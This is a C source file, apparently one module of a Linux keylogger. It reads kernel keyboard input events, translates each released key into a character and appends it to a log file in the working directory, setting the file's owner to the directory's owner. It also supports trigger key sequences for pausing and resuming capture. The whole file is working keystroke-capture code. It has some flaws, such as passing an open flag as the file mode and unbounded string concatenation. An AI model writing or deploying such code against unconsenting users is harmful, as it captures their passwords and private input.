#include <errno.h>
#include <fcntl.h>      /* for open */
#include <stdbool.h>    /* for bool */
#include <stdlib.h>     /* for malloc */
#include <string.h>     /* for strerror */
#include <sys/stat.h>   /* for mode */
#include <unistd.h>     /* for getcwd */

#include "common.h"
#include "keylog.h"
#include "logger.h"

#define BUFFSIZE 255
#define MAX_KEY_SEQ 5

enum ev_value {
    RELEASED,
    PRESSED,
    REPEATED,
};

struct priv {
    keyseq_t seq_list[MAX_KEY_SEQ]; /* hard code for now */
    int num_seq;

    struct {
        int fd; /* file descriptor */
        mode_t mode;
        char name[KEY_LOG_LEN];
        int flags;
    } log;
};

static int keylog_open(keylog_t *kl)
{
    struct priv *priv = (struct priv *) kl->priv;

    int oflag;
    char path[BUFFSIZE];
    struct stat stat_cwd;

    /* open for writing only, create file if doesn't exist */
    oflag = (O_WRONLY | O_CREAT);

    if (priv->log.flags & KEY_LOG_FLAG_APPEND) {
        oflag |= O_APPEND;
    } else {
        /* Truncate the file to 0 */
        oflag |= O_TRUNC;
    }

    getcwd(path, BUFFSIZE);

    /* collect information about the current directory */
    stat(path, &stat_cwd);

    strcat(path, "/");
    strcat(path, priv->log.name);
    logger.info("Log file: %s", path);

    priv->log.fd = open(path, oflag, O_WRONLY);

    /* Set the owner to match that of the directory that it's run under */
    fchown(priv->log.fd, stat_cwd.st_uid, stat_cwd.st_gid);
    fchmod(priv->log.fd, priv->log.mode);

    return OK;
}

static int keylog_close(keylog_t *kl)
{
    struct priv *priv = (struct priv *) kl->priv;

    if (close(priv->log.fd) == ERROR) {
        logger.warn("Closing %s failed: %s",
                     priv->log.name, strerror(errno));
        return ERROR;
    }

    return OK;
}

static bool has_seq_triggered(unsigned short ev_code,
                              keyseq_t *seq)
{
    bool seq_triggered = false;

    if (ev_code == seq->keys[seq->index]) {
        seq->index++;

        if (seq->index == seq->size) {
            seq->index = 0;
            seq_triggered = true;
        }
    } else {
        seq->index = 0;
    }

    return seq_triggered;
}

/*
 * Structure definition:
 *
 * struct input_event {
 *    struct timeval time;
 *    unsigned short type;
 *    unsigned short code;
 *    unsigned int value;
 * }
 */

static void keylog_log(keylog_t *kl, struct input_event e)
{
    struct priv *priv = (struct priv *) kl->priv;

    if (!kl->logging_enabled) {
        return;
    }

    char c;
    unsigned short code = e.code;

    switch (code) {
    case KEY_1: c = '1'; break;
    case KEY_2: c = '2'; break;
    case KEY_3: c = '3'; break;
    case KEY_4: c = '4'; break;
    case KEY_5: c = '5'; break;
    case KEY_6: c = '6'; break;
    case KEY_7: c = '7'; break;
    case KEY_8: c = '8'; break;
    case KEY_9: c = '9'; break;
    case KEY_0: c = '0'; break;

    case KEY_A: c = 'a'; break;
    case KEY_B: c = 'b'; break;
    case KEY_C: c = 'c'; break;
    case KEY_D: c = 'd'; break;
    case KEY_E: c = 'e'; break;
    case KEY_F: c = 'f'; break;
    case KEY_G: c = 'g'; break;
    case KEY_H: c = 'h'; break;
    case KEY_I: c = 'i'; break;
    case KEY_J: c = 'j'; break;
    case KEY_K: c = 'k'; break;
    case KEY_L: c = 'l'; break;
    case KEY_M: c = 'm'; break;
    case KEY_N: c = 'n'; break;
    case KEY_O: c = 'o'; break;
    case KEY_P: c = 'p'; break;
    case KEY_Q: c = 'q'; break;
    case KEY_R: c = 'r'; break;
    case KEY_S: c = 's'; break;
    case KEY_T: c = 't'; break;
    case KEY_U: c = 'u'; break;
    case KEY_V: c = 'v'; break;
    case KEY_W: c = 'w'; break;
    case KEY_X: c = 'x'; break;
    case KEY_Y: c = 'y'; break;
    case KEY_Z: c = 'z'; break;

    case KEY_COMMA: c = ','; break;
    case KEY_SEMICOLON: c = ';'; break;
    case KEY_APOSTROPHE: c = '\''; break;
    case KEY_DOT: c = '.'; break;
    case KEY_SLASH: c = '/'; break;
    case KEY_BACKSLASH: c = '\\'; break;
    case KEY_BACKSPACE: c = '<'; break;

    case KEY_MINUS: c = '-'; break;
    case KEY_EQUAL: c = '='; break;
    case KEY_GRAVE: c = '~'; break;

    case KEY_ENTER: c = '\n'; break;
    case KEY_TAB: c = '\t'; break;
    case KEY_SPACE: c = ' '; break;

    default: c = '\0'; break;
    }

    write(priv->log.fd, &c, 1);
}

void keylog_process_event(keylog_t *kl, struct input_event e)
{
    struct priv *priv = (struct priv *) kl->priv;

    if (e.type == EV_KEY && e.value == RELEASED) {
        keylog_log(kl, e);

        for (int k = 0; k < priv->num_seq; k++) {
            if (has_seq_triggered(e.code, &priv->seq_list[k])) {
                priv->seq_list[k].callback(kl);
            }
        }
    }
}

void keylog_install_seq(keylog_t *kl, keyseq_t seq)
{
    struct priv *priv = (struct priv *) kl->priv;

    priv->seq_list[priv->num_seq++] = seq;
}

void keylog_pause(keylog_t *kl)
{
    kl->logging_enabled = false;
}

void keylog_resume(keylog_t *kl)
{
    kl->logging_enabled = true;
}

keylog_t *create_keylog(const cmd_args_t cmd_args)
{
    keylog_t *kl;
    struct priv *priv;

    kl = (keylog_t *) malloc(sizeof(keylog_t));
    priv = (struct priv *) malloc(sizeof(struct priv));

    kl->open = keylog_open;
    kl->close = keylog_close;
    kl->process_event = keylog_process_event;
    kl->install_seq = keylog_install_seq;

    kl->pause = keylog_pause;
    kl->resume = keylog_resume;

    priv->log.flags = cmd_args.keylog.flags;
    priv->log.mode = cmd_args.keylog.mode;
    strncpy(priv->log.name, cmd_args.keylog.filename, KEY_LOG_LEN);

    priv->num_seq = 0;

    kl->logging_enabled = true;

    kl->priv = (void *) priv;

    return kl;
}

void destroy_keylog(keylog_t *kl)
{
    free(kl);
}